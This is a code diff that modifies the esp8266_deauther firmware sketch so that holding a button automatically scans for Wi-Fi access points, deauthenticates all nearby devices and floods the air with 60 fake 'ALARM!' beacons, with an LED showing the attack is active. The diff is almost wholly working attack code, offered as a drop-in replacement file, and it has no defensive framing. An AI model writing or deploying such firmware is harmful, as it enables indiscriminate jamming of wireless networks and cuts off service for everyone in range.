@@ -1,4 +1,7 @@
- /*
+//  To automate the deauth attack on all devices simply replace
+//  'esp8266_deauther/esp8266_deauther/esp8266_deauther.ino' with this file. 
+
+/*
   ===========================================
        Copyright (c) 2018 Stefan Kremser
               github.com/spacehuhn
@@ -55,6 +58,12 @@ uint32_t currentTime = 0;
 bool booted = false;
 
 void setup() {
+  // enable button pin
+  pinMode(D5, INPUT_PULLUP);
+
+  // enable LED pin
+  pinMode(D4, OUTPUT);
+ 
   // "fix" for RGB LEDs
   analogWriteRange(0xff);
   
@@ -148,6 +157,23 @@ void setup() {
 }
 
 void loop() {
+  if(digitalRead(D5)){
+    if(!attack.isRunning()){
+      serialInterface.runCommand("stopap");                    // stop access point and web interface
+      serialInterface.runCommand("set beaconinterval true");   // change beacon interval from 10/s to 1/s for better performance
+      serialInterface.runCommand("scan aps -c 60s");           // start scan for access points each minute
+      serialInterface.runCommand("add ssid ALARM! -cl 60 -f"); // add SSID "ALARM!" 60 times
+      serialInterface.runCommand("attack -da -b");             // start deauth all and beacon attack
+      digitalWrite(D4, LOW);                                   // turn LED on
+    }
+  }else{
+    if(attack.isRunning()){
+      scan.stop();             // stop scan
+      attack.stop();           // stop attack
+      digitalWrite(D4, HIGH);  // turn LED off
+    }
+  }
+ 
   currentTime = millis();
 
   wifiUpdate(); // manage access point
@@ -174,8 +200,3 @@ void loop() {
     booted = true;
   }
 }
-
-
-
-
-
